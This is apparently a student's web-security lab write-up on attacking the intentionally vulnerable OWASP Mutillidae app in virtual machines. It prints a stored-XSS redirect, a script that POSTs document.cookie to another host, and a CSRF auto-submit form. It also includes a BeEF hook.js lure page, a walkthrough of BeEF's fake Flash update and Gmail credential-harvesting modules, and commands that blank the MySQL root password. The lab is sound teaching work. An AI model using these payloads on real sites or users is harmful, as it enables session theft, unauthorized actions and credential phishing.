# INFO-6076 – Web Security
## 💥 Lab 03: XSS, CSRF, and BeEF

This lab explores the exploitation of web vulnerabilities including **Stored XSS**, **Cross-Site Request Forgery (CSRF)**, and **Browser Exploitation Framework (BeEF)** techniques on a vulnerable web app: **OWASP Mutillidae**.

---

## 🔧 Prerequisites

- Kali Linux VM with Firefox and BeEF installed
- Ubuntu VM running Mutillidae
- Windows 10 VM with Firefox browser
- Internet connectivity
- Apache server on Kali
- VMware Workstation 16+

## 🧪 Lab Components
Requirements
- Internet connectivity & VMware Workstation version 16 or above
- Mutillidae installed and running on the Ubuntu VM

### ✅ Part 1: Stored XSS – Page Redirection
On my Kali Linux VM
An attacker can also use a simple script to redirect the user to another page. Usually this would be a page controlled by the attacker
▪ Reset the DB then enter the following text in the Add To Your Blog Page page by going through the menus on the left:
OWASP 2017 -> A7 – Cross Site Scripting (XSS) -> Persistent -> Add to your blog
- Use `<script>window.location = "http://www.offensive-security.com/"</script>` on blog entry

On my Windows 10 VM

I opened Firefox and went to the main Mutillidae page. Then to the Add to your blog page
Do not continue until you have the redirection working (Please note that you won’t reach the website if you don’t have an internet connection but the redirection should work)

### Grabbing Session Tokens with Stored XSS
I reset the DB to stop the redirection and navigated to the Add to your blog page
▪ if you still get redirected? you need to click on Reset DB again.

On my Kali Linux VM
I created a user with the name oabolurin and logged in as that user
i navigated to the Add to Your Blog page and enter the following text:
`<script>document.location="http://oabolurin-uws/mutillidae/index.php?page=capture-data.php"</script>`

if recreting this, you will eventually be redirected to the Data Capture Page (it can take some time)

i navigated to the View Captured Data Page using the left menu, if the link on the page doesn’t work

The steps above:
- Demonstrated malicious redirection through stored XSS
- Verified on Windows 10 VM via Firefox
- Grabbing session tokens using `<script>document.location="http://oabolurin-uws/mutillidae/index.php?page=capture-data.php"</script>`

📸 See `screenshots/slide01.png` and `slide02.png`
<img width="1531" height="745" alt="Slide 1" src="https://github.com/user-attachments/assets/ba482c8a-6ceb-4ae7-8a5e-21b548fc63f7" />


The problem at this point is that we are redirecting the user to a specific page that is capturing the data, and they will know something has happened. In real situation, the user wouldn’t be redirected, the data would simply get logged in the background.
Next, i used a script that comes with Mutillidae to log data in the background
▪Logout of Mutillidae, Reset the DB, Disable Hints and Hide Popup Hints

On my Kali Linux VM

In Mutillidae, i clicked on the Installation Instructions: Windows 7 (PDF) listed under the Documentation menu on the left (if prompted to save the file. Do not save the file) the interest is to know where this file is located on the server.

i deleted everything after …documentation/ in the URL and hit enter
From the index page i found, i clicked on/open Mutillidae-Test-Scripts.txt file

```
<script>
	var lXMLHTTP;
	try{ 
		var lData = "data=" + encodeURIComponent(document.cookie);
		var lHost = "oabolurin-uws";
		var lProtocol = "http";
		var lFilePath = "/mutillidae/capture-data.php";
		var lAction = lProtocol + "://" + lHost + lFilePath;
		var lMethod = "POST";

		try {
			lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP"); 
		}catch (e) { 
			try { 
				lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); 
			}catch (e) { 
				try { 
					lXMLHTTP = new XMLHttpRequest(); 
				}catch (e) { 
					//alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
				} 
			} 
		}//end try

		lXMLHTTP.onreadystatechange = function(){} 
		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader("Host", lHost); 
		lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");			
		lXMLHTTP.send(lData);

	}catch(e){ 
	} 
</script>
```

Using notepad i modified the script to change localhost to oabolurin-uws (hostname of my Ubuntu VM) then i navigated to the Login/Register page in Firefox and created a user with the name hacker and logged in as that user afterwhich i pasted the modified script into the Add to Your Blog page (as the hacker user) and saved the Blog Entry


On my Windows 10 VM

I created a new user oabolurin then logged in as that user and navigated to the View Someone’s Blog Page and choose to show all blog entries


On my Kali Linux VM
I navigated to the View Captured Data Page to see the information that was logged in the background

📸 See `screenshots/slide02.png`
<img width="1523" height="788" alt="Slide 2" src="https://github.com/user-attachments/assets/6e8dd724-2485-4c59-8c63-584761e14480" />


---

### ✅ Part 2: CSRF Attack via Blog Entry

On your Kali Linux VM
I reset the database in Mutillidae
▪ To find the Mutillidae-Test-Scripts file in the Mutillidae folder and locate the following script in the Cross Site Scripting, Defense: Encoding section

the hint is to look into the Directory traversal from documentation…
Find the section that deals with Cross Site Request Forgery and copy the following markup:
(Hint: Use Ctrl-F, then search Forgery)

Paste the code into a text editor of your choice. Modify lines 3 and 6 of the script to say the following:

`<input type=”hidden” name=”blog-entry” value=”ISM is great!!!”/>`

`<i onmouseover="window.document.getElementById(\'f\').submit()">oabolurin will get A+ in this course</i>`

as shown below
```
<form id="f" action="index.php?page=add-to-your-blog.php" method="post" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="csrf-token" value="best-guess"/>
<input type=”” name=”blog-entry” value= ”ISM is great!!!” />
<input type="hidden" name="add-to-your-blog-php-submit-button" value="TESTING"/>
</form>
<i onmouseover="window.document.getElementById(\'f\').submit()">oabolurin will get A+ in this course</i>
```

I openned a new tab in Firefox and navigated to the Add to Your Blog page by going through the menus on the left: OWASP 2017 -> A7 – Cross Site Scripting (XSS) -> Persistent -> Add to your blog
The purpose of this script is to add a blog entry to an authenticated user’s blog when they hover over the text "ISM is great!!!"
So i pasted the CSRF markup from my notepad into the Add New Blog Entry form and saved it.
A new entry "ISM is great!!!" was created by an anonymous user


On my Windows 10 VM:

I went to the Login/Register page and created a new user oabolurin with password Windows1 and navigated back to the Login/Register page and logged in as that user

then navigated to the View Someone’s Blog page:

OWASP 2017 -> A7 Cross Site Scripting -> Persistent -> View Someone’s Blog

i then selected Show All in the drop down list, and then choose View Blog Entries.

Upon hovering over the text "oabolurin will get A+ in this course" i was redirected to blog page (I noticed that doing it more than once will have multiple entries)

I navigated back to the View Someone’s Blog page and View all blog entries again and noticed a new entry from the oabolurin user with a comment: "ISM is great!!!"



Lab achievements:

- Identified and modified a CSRF payload using directory traversal
- Inserted invisible form submission using:
  ```html
  <i onmouseover="window.document.getElementById('f').submit()">oabolurin will get A+ in this course</i>

📸 See screenshots/slide03.png
<img width="1533" height="580" alt="Slide 3" src="https://github.com/user-attachments/assets/a71fd556-538b-4a8e-9d8b-afa828036aac" />


Explanation:

CSRF attacks take advantage of the statelessness of the HTTP protocol. Typically, CSRF will be used to perform harmful actions using the victim's authenticated session. If a victim has logged into the target site, an attacker can coerce the victim's browser to perform unauthorized actions on the target website.
In the example above attacker ('anonymous' user) added a malicious CSRF code to the blog.
Then a victim logged into the website as a valid user. When you hovered over the text "oabolurin will get A+ in this course", your browser executed that hidden code and a harmful action (a new blog entry on your behalf) was performed without your consent.
Unlike cross-site scripting (XSS) which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user (i.e. user's browser).

---

### ✅ Part 3: BeEF Setup and Hook

On my Kali VM

I ensured that i have the Browser Exploitation Framework installed on my version of Kali Linux. If you don ot, run `apt update && apt upgrade` then use the following steps to install beef:

** make sure to run the following commands as a super user **
`sudo apt install beef-xss`

▪ Say yes when prompted

Once finished, run beef with:

`sudo beef-xss`

Note: You may need to go into /bin/beef/config.yaml with an editor and change the default user/pass to something like beef1

Go to /var/www/html and create an html file where you can link your hook.js script

### 📝 `testanswers.html` (sample payload for hooking)
```
html
<!DOCTYPE html>
<html>
<head>
  <title>oabolurin</title>
  <script src="http://10.0.0.99:3000/hook.js"></script>
</head>
<body>
  <h1>Welcome to oabolurin’s Cheat Sheet!!!</h1>
  <p>You can find the answers to all of Art’s tests here.</p>
</body>
</html>
```

their is a need to specify the IP address of the BeEF server, the listening port, and the path/name of the JavaScript file you are using to hook the browser in the head section of your html file

`<script src="http://10.0.0.99:3000/hook.js"></script>`

i saved the file as testanswers.html & Started Apache on Kali Linux, the script is shown above

I issued the following commands in Kali Linux:

▪ netstat –tuna

▪ cat testanswers.html

▪ date

📸 See screenshots/slide04.png and HTML file testanswers.html
<img width="748" height="752" alt="Slide 4" src="https://github.com/user-attachments/assets/eec4904c-8c93-48a3-bd4a-66373f078ee9" />


Lab achievements:

- Installed and ran beef-xss on Kali
- Created a hook-enabled HTML page (testanswers.html)
- Hooked a Windows 10 browser by redirecting via XSS payload
- Verified BeEF control panel is capturing browser


---

### ✅ Part 4: Hooking via Mutillidae Blog

On my Kali Linux VM

Using Firefox, i navigated to Mutillidae running on Ubuntu by going to http://oabolurin-uws/mutillidae/
In the case of replication, if you receive the Database Offline message, try clicking on setup/reset the DB
If this produces errors, manually adjust the mysql database settings from the Ubuntu terminal, by issuing the following commands:

```
mysql -u root
use mysql;
update user set authentication_string=PASSWORD('') where user='root';
update user set plugin='mysql_native_password' where user='root';
flush privileges;
quit;
```

No errors should be received when the database is reset 
Recall the script that was used earlier in this lab to launch a CSRF attack
the hint here is using directory traversal to navigate to the Mutillidae-Test-Scripts.txt document
During that attack, the user submitted a blog without their consent. 
Navigate through the menus on the left to the add-to-your-blog.php page
The task is to submit a blog entry as an anonymous user that will redirect a user’s browser to the script you created in Part 3 of this lab. The redirect needs to happen when a user hovers their mouse over some text in the comment section.
Once you are finished submitting the script to the server on Kali Linux, open BeEF by clicking on the icon or running the executable file
I logged in using beef/beef1 (Or what you set your new BeEF password to…)
i Made sure my BeEF Control Panel is running before proceeding to the next step


On my Windows 10 VM

I checked to see that i can navigate to http://10.0.0.99 from my Windows 10 VM using a browser
I navigated to http://oabolurin-uws/mutillidae and created a new user in Mutillidae with the following credentials:
User: oabolurin
Pass: test

I logged in as the new oabolurin user and navigated to the View Someones Blog page in Mutillidae as the logged in user and selected Show All from the pull down menu then hovered over the text in the latest blog entry.
If everything was done correctly, you should be redirected to the testanswers.html page
(You may need to try more than once to have the page redirect)


Lab achievements:

- Used a modified blog entry with BeEF hook
- Logged into Mutillidae as victim user
- Hovered to trigger browser hook to BeEF panel

📸 See screenshots/slide05.png
<img width="1387" height="797" alt="Slide 5" src="https://github.com/user-attachments/assets/3a03fdef-0796-4544-80f9-c1b0220b4772" />

---

### ✅ Part 5: System Fingerprinting via BeEF

On your Kali Linux VM

I clicked on the browser from a Windows VM in the left menu on BeEF under Hooked Browsers to see options in the Current Browser tab
Found the correct option to detect if the host is running in a VM, a list in the Details sub-tab to show a key named hardware.gpu with a value of Virtual Machine
IF NOT – navigate through the menus to see what proof you can find that this machine is virtualized

Lab achievements:

- Verified virtual machine detection via hardware.gpu
- I dentified host environment in BeEF details tab

📸 See screenshots/slide06.png
<img width="1527" height="719" alt="Slide 6" src="https://github.com/user-attachments/assets/0c8f004e-9aa6-4f15-a631-0889794f0f2d" />

---

### ✅ Part 6: Social Engineering via BeEF

I clicked on the Commands tab and navigate to the Social Engineering Module and select Fake Flash Update
In the right section, under Fake Flash Update  need some adjustments like changing the Image Path to point to the attacker’s IP. After clicking on execute, the fake Adobe Flash Player update pop up on the Windows 10 client in the browser that was hooked:

if the user clicks on INSTALL, they will download a file, i can change the file that the user downloads
Find the Module that prompts the user to enter their Google Mail credentials
Execute the attack
You will see the Google Mail Login Screen pop up on the Client side
Enter some credentials into the fields
Check back to the BeEF Control Panel and see if you can see the data the user has entered


- Executed “Fake Flash Update” attack
- Collected dummy Google credentials from victim
- Verified harvested data from BeEF control panel

📸 See screenshots/slide07.png
<img width="1530" height="715" alt="Slide 7" src="https://github.com/user-attachments/assets/7687a42f-b439-4bbf-a8a0-b8797aedf87e" />

---

### 📂 Files Included
- testanswers.html – Hook-enabled attacker page for BeEF

screenshots/ – Contains slide screenshots (7 total)

---

